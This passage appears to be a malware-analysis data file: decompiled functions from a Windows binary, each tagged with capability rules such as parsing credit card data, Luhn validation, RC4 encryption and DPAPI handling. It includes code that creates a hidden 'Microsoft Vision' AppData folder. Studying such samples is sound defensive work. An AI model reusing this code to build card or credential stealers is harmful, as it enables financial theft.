            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c9f2(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint noname_4;\n    int32_t var_ch;\n    uint hMem;\n    uint32_t var_4h;\n    \n    uVar3 = 0;\n    iVar2 = fcn.0040cc54(&fcn.0040c9f2::var_4h);\n    uVar1 = hMem;\n    if (iVar2 != 0) {\n        if (4 < var_4h) {\n            noname_4 = 0x40ca23;\n            iVar2 = fcn.00401000(hMem, \"DPAPI\", 5);\n            if (iVar2 == 0) {\n                iVar2 = fcn.0040ca78(in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, in_stack_ffffffd4, \n                                     noname_4, &fcn.0040c9f2::hMem, &fcn.0040c9f2::var_ch);\n                if (iVar2 != 0) {\n                    if (var_ch == 0x20) {\n                        uVar3 = fcn.0040ccb4(arg_10h);\n                    }\n                    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_LocalFree)(uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 377
    },
    "0040e996": {
        "rules": [
            "parse credit card information/4eef9ae1278b42f592aee8ead6d8bf37"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __fastcall fcn.0040e996(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint *arg_8h;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t lpNumberOfBytesRead;\n    int32_t nNumberOfBytesToRead;\n    \n    while( true ) {\n        nNumberOfBytesToRead = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_PeekNamedPipe)(param_1[2], 0, 0, 0, &fcn.0040e996::nNumberOfBytesToRead, 0);\n        if (iVar2 == 0) break;\n        if (nNumberOfBytesToRead == 0) {\n            return 1;\n        }\n        var_ch = nNumberOfBytesToRead + 1;\n        var_10h = 0x40e9b7;\n        iVar2 = fcn.00401085();\n        lpNumberOfBytesRead = 0;\n        var_ch = 0;\n        var_10h = &fcn.0040e996::lpNumberOfBytesRead;\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(param_1[2], iVar2, nNumberOfBytesToRead);\n        if (iVar1 == 0) break;\n        *(lpNumberOfBytesRead + iVar2) = 0;\n        var_ch = lpNumberOfBytesRead;\n        var_10h = iVar2;\n        fcn.00402f91(iVar2, lpNumberOfBytesRead);\n        fcn.00401099(iVar2);\n        fcn.00402ecf(&fcn.0040e996::var_10h);\n        fcn.00402f22(&fcn.0040e996::var_ch);\n        fcn.0040308c();\n        arg_8h = &fcn.0040e996::var_ch;\n        uVar3 = extraout_ECX;\n        fcn.004033f5(arg_8h);\n        (**(*param_1 + 4))(arg_8h, uVar3);\n        fcn.00405ea5();\n        fcn.00405ea5();\n        var_10h = NULL;\n        fcn.00403036();\n    }\n    var_ch = 0x40ea6d;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar2 == 0x6d) || (iVar2 == 0xe8)) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 663
    },
    "00411ce2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411ce2(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    do {\n        uVar1 = fcn.00411d0c(arg_8h);\n        *(arg_8h + param_1) = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"[uVar1 % 0x3e];\n        arg_8h = arg_8h + 1;\n    } while (arg_8h < 10);\n    *(param_1 + 10) = 0;\n    return;\n}\n",
        "token_count": 140
    },
    "00401144": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t fcn.00401144(uint8_t *param_1, uint8_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = *param_1 - *param_2;\n        if ((iVar1 != 0) || (*param_2 == 0)) break;\n        param_1 = param_1 + 1;\n        param_2 = param_2 + 1;\n    }\n    if (iVar1 < 0) {\n        return -1;\n    }\n    if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 142
    },
    "00408502": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408502(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar4 = 0x414950 - param_2;\n    do {\n        uVar3 = *(iVar4 + param_2);\n        uVar1 = *param_2;\n        uVar2 = uVar3 + 0x20;\n        if (0x19 < uVar3 - 0x41) {\n            uVar2 = uVar3;\n        }\n        param_2 = param_2 + 1;\n        uVar3 = uVar1 + 0x20;\n        if (0x19 < uVar1 - 0x41) {\n            uVar3 = uVar1;\n        }\n    } while ((uVar2 != 0) && (uVar2 == uVar3));\n    return uVar2 - uVar3;\n}\n",
        "token_count": 233
    },
    "004095aa": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "create or open file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004095aa(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    uint uStack840;\n    char16_t *pcStack836;\n    uint32_t auStack832 [3];\n    uint uStack820;\n    code *pcStack816;\n    uint uStack812;\n    int32_t iStack740;\n    uchar auStack576 [8];\n    uchar auStack568 [564];\n    \n    uStack812 = 0;\n    pcStack816 = 0x4095c2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    pcStack816 = 0x800;\n    auStack832[2] = *0x4196a0 + 0x210;\n    uStack820 = 0;\n    auStack832[1] = 0x409603;\n    fcn.00401052();\n    auStack832[2] = *0x4196a0 + 0x10;\n    pcStack816 = 0x208;\n    uStack820 = 0;\n    auStack832[1] = 0x40961a;\n    fcn.00401052();\n    pcStack816 = *0x4196a0 + 0x10;\n    uStack820 = 0;\n    auStack832[2] = 0;\n    auStack832[1] = 0x1c;\n    auStack832[0] = 0;\n    pcStack836 = 0x409631;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    pcStack836 = L\"\\\\Microsoft Vision\\\\\";\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)();\n    if (*(*0x4196a0 + 0xa14) != 0) {\n        fcn.00401052(&stack0xfffffdc8);\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        (*pcVar1)(&stack0xfffffdc0, 0x414a58);\n        fcn.004035e5(0x4096b0);\n        fcn.0040ff27(0x4096b9);\n        fcn.00401bed(0x4096cc);\n        if (iStack740 != 0) {\n            fcn.00401ad5();\n        }\n    }\n    uVar3 = fcn.004034a7();\n    fcn.0040346a(0x414a5c);\n    fcn.00403335(uVar3);\n    fcn.00405ea5();\n    uStack840 = 0;\n    if (*(*0x4196a0 + 0xa14) != 0) {\n        (*_sym.imp.KERNEL32.dll_GetLocalTime)(&stack0xfffffcbc);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (&stack0xfffffd1c, L\"%02d-%02d-%02d_%02d.%02d.%02d\", pcStack836 >> 0x10, 0, 0, auStack832[0] & 0xffff\n                   , auStack832[0] >> 0x10, auStack832[1] & 0xffff);\n        puVar6 = &stack0xfffffd1c;\n        iVar4 = *0x4196a0 + 0x10;\n        fcn.0040346a(iVar4);\n        fcn.0040346a(iVar4);\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(*0x4196a0 + 0xc), 0x10000000, 1, 0, 2, 0x80, 0, iVar4, puVar6);\n        *(*0x4196a0 + 4) = uVar3;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    pcStack816 = fcn.0040902e;\n    (*_sym.imp.USER32.dll_RegisterClassW)(&stack0xfffffccc);\n    uVar2 = (*_sym.imp.USER32.dll_CreateWindowExW)(0, 0, 0, 0, 0, 0, 0, 0, 0xfffffffd, 0, uVar2, arg_8h);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    puVar5 = &stack0xfffffcc0;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xfffffcc0, uVar2, 0, 0);\n    uVar3 = uStack840;\n    if (iVar4 != 0) {\n        do {\n            uVar3 = 0xffffffff;\n            if (iVar4 == -1) break;\n            (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffcb0);\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xfffffcac);\n            iVar4 = (*pcVar1)(&stack0xfffffca8, uVar2, 0, 0);\n            uVar3 = uStack840;\n        } while (iVar4 != 0);\n    }\n    fcn.00405ea5();\n    return uVar3;\n}\n",
        "token_count": 1250
    },
    "00401190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401190(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 166
    },
    "00401433": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401433(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00405f53();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 4;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar1 + *in_ECX;\n                fcn.00403437(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-1] = *(arg_8h_00 + 4);\n                *piVar1 = *(arg_8h_00 + 8);\n                piVar1[1] = *(arg_8h_00 + 0xc);\n                piVar1 = piVar1 + 4;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401aa8();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.00403437(&arg_8h);\n    var_8h[piVar1 * 4 + 1] = arg_ch;\n    var_8h[piVar1 * 4 + 2] = arg_10h;\n    var_8h[piVar1 * 4 + 3] = arg_14h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 633
    },
    "00401534": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401534(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00405f53();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 184
    },
    "00401581": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401581(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00405ca3();\n    arg_8h_00 = arg_ch * 0x10 + *in_ECX;\n    fcn.0040362d(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = *(arg_8h_00 + 0xc);\n    return arg_8h;\n}\n",
        "token_count": 169
    },
    "004016e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016e3(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar1 = fcn.00405f53();\n    if (piVar1 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar1 = piVar3;\n        piVar2 = piVar1 + 1;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 189
    },
    "00401735": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00401735(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint *puVar1;\n    \n    fcn.00405ca3();\n    puVar1 = arg_ch * 0xc + *in_ECX;\n    *arg_8h = *puVar1;\n    fcn.0040362d(puVar1 + 1);\n    fcn.0040362d(puVar1 + 2);\n    return arg_8h;\n}\n",
        "token_count": 120
    },
    "00401776": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401776(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00405f53();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 6;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 4;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-0x10 - var_8h) + piVar1 + *in_ECX;\n                fcn.00403437(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-2] = *(arg_8h_00 + 8);\n                piVar1[-1] = *(arg_8h_00 + 0xc);\n                *piVar1 = *(arg_8h_00 + 0x10);\n                piVar1 = piVar1 + 6;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401ad5();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.00403437(&arg_8h);\n    var_8h[piVar1 * 6 + 2] = arg_10h;\n    var_8h[piVar1 * 6 + 3] = arg_14h;\n    var_8h[piVar1 * 6 + 4] = arg_18h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 647
    },
    "00401875": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401875(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00405f53();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 6;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 184
    },
    "004018c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004018c2(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00405ca3();\n    arg_8h_00 = arg_ch * 0x18 + *in_ECX;\n    fcn.0040362d(arg_8h_00);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = *(arg_8h_00 + 0xc);\n    *(arg_8h + 0x10) = *(arg_8h_00 + 0x10);\n    return arg_8h;\n}\n",
        "token_count": 174
    },
    "00401903": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401903(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00405f53();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar1 + *in_ECX;\n                fcn.00403437(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-1] = *(arg_8h_00 + 4);\n                *piVar1 = *(arg_8h_00 + 8);\n                piVar1 = piVar1 + 3;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401b00();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.00403437(&arg_8h);\n    var_8h[piVar1 * 3 + 1] = arg_ch;\n    var_8h[piVar1 * 3 + 2] = arg_10h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 583
    },
    "004019f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004019f6(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00405f53();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 185
    },
    "00401a43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401a43(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00405ca3();\n    arg_8h_00 = arg_ch * 0xc + *in_ECX;\n    fcn.0040362d(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    return arg_8h;\n}\n",
        "token_count": 145
    },
    "00401a7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401a7e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.004013ef();\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 81
    },
    "00401aa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401aa8(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x10 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -4;\n        fcn.00405ea5();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 127
    },
    "00401ad5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401ad5(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x18 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -6;\n        fcn.00405ea5();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 127
    },
    "00401b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401b00(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0xc + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -3;\n        fcn.00405ea5();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 126
    },
    "00401e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e9c(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    int32_t in_stack_00000008;\n    int32_t in_stack_0000000c;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = in_ECX[2];\n    if (piVar3 < in_ECX[1]) {\n        piVar2 = *in_ECX;\n    }\n    else {\n        piVar5 = (piVar3 + 1U) * in_ECX[3];\n        piVar2 = fcn.00405f53();\n        piVar3 = NULL;\n        if (piVar2 == NULL) {\n            piVar2 = NULL;\n        }\n        else {\n            *piVar2 = piVar5;\n            piVar2 = piVar2 + 1;\n        }\n        if (in_ECX[2] != NULL) {\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + piVar2;\n                puVar6 = *in_ECX + iVar4;\n                piVar3 = piVar3 + 1;\n                iVar4 = iVar4 + 0xc;\n                *puVar1 = *puVar6;\n                puVar1[1] = puVar6[1];\n                puVar1[2] = puVar6[2];\n            } while (piVar3 < in_ECX[2]);\n        }\n        piVar3 = in_ECX[2];\n        *in_ECX = piVar2;\n        in_ECX[1] = piVar5;\n    }\n    piVar2 = piVar2 + piVar3 * 3;\n    *piVar2 = arg_8h;\n    piVar2[1] = in_stack_00000008;\n    piVar2[2] = in_stack_0000000c;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 484
    },
    "00401fcb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401fcb(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar4 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar2 = fcn.00405f53();\n        if (piVar2 == NULL) {\n            piVar2 = NULL;\n        }\n        else {\n            *piVar2 = piVar4;\n            piVar2 = piVar2 + 1;\n            piVar1 = piVar2;\n            for (piVar3 = piVar4; piVar3 != NULL; piVar3 = piVar3 + -1) {\n                *piVar1 = 0;\n                piVar1[1] = 0;\n                piVar1[2] = 0;\n                piVar1 = piVar1 + 4;\n            }\n        }\n        piVar3 = NULL;\n        if (in_ECX[2] != NULL) {\n            var_4h = 0;\n            do {\n                fcn.004020da(*in_ECX + var_4h);\n                piVar3 = piVar3 + 1;\n                var_4h = var_4h + 0x10;\n            } while (piVar3 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401a7e();\n        }\n        *in_ECX = piVar2;\n        in_ECX[1] = piVar4;\n    }\n    fcn.004020da(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.004013ef();\n    return;\n}\n",
        "token_count": 445
    },
    "00402110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402110(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00405f53();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[2] = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 206
    },
    "00402164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402164(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.00405ca3();\n    fcn.00401f95(arg_ch * 0x10 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 71
    },
    "004021bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
